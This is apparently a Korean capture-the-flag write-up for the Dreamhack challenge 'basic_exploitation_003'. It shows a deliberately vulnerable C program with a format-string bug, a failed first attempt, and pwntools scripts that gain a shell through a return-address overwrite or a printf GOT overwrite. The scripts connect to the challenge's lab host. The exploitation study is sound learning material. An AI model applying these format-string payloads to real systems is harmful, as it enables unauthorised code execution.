## basic_exploitation_003
---

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}
void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(30);
}
void get_shell() {
    system("/bin/sh");
}
int main(int argc, char *argv[]) {
    char *heap_buf = (char *)malloc(0x80);
    char stack_buf[0x90] = {};
    initialize();
    read(0, heap_buf, 0x80);
    sprintf(stack_buf, heap_buf);
    printf("ECHO : %s\n", stack_buf);
    return 0;
}
```

<br>

```
Ubuntu 16.04
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
```

<br><br>

## Solution
---

sprintf로 포맷인자를 사용하지 않고 값을 넘겨주므로 fsb가 발생한다.

<br>

```
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
ECHO : AAAA.41414141.3431342e.34313431.34332e31.34333133.332e6532.33313334.2e313334.33333433.31336532
```

<br>

두 번째 포맷인자에서 포맷스트링을 참조하는 것을 알 수 있다.

그래서 ret 주소를 포맷스트링 취약점을 이용해서 get_shell 주소로 덮어씌우고자 했다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',19024)

context.log_level = 'debug'

# ret = 0xffffd28c
ret_1 = 0xffffd28c
ret_2 = 0xffffd28e

# get_shell = 0x08048669

# 0x8669 - 8 = 34001
# 0x0804 - 0x8669 = -32357
# 0x10804 - 0x8669 = 33179

payload = p32(ret_1) + p32(ret_2) + b'%34001x%1$hn' + b'%33179x%2$hn'

p.send(payload)

p.interactive()
```

<br>

ret 주소는 main에 브레이크를 건 뒤 esp 값을 확인하면 알 수 있다.

따라서 2바이트씩 나누어서 덮어씌웠는데... 셸이 흭득되지 않는다.

이유를 찾아보니 stack_buf의 크기는 0x90인데 저 페이로드로 보내면 값이 다 담기지가 않게 되거나 아니면 출력 범위를 넘어서서 segmentation fault가 발생하거나 둘 중 하나라고 한다.

segmentation fault는 문구가 나오지 않아서 잘 모르겠다.

<br>

길이 지정자 중에 %hhn이 있는데 이 길이 지정자는 char 형태 즉, 1바이트만 읽게 된다.

따라서 %hhn을 이용해서 시도하면 된다고 하는데..

위의 풀이 방식은 잘못된거였다.

이 문제에는 2개의 풀이가 존재를 하는데, 하나는 fsb를 이용해서 bof를 일으켜서 ret의 주소를 바꾸는 것이고, 나머지 하나는 fsb를 이용해 printf의 got에 overwrite하는 것이다.

<br>

```python
from pwn import *

p = remote('host3.dreamhack.games',19209)

# solution 1 ---> fsb + bof + ret overwrite

# get_shell = 0x08048669
# payload = b'%156c' + p32(get_shell)
# p.sendline(payload)


# Solution 2 ---> fsb + got overwrite

# e = ELF('./basic_exploitation_003')
# printf_got = e.got['printf'] #  0x0804 84 66 -> 86 69

# payload = p32(printf_got) + p32(printf_got+1) + b'%97c%1$hhn%29c%2$hhn'
# p.sendline(payload)

p.interactive()
```
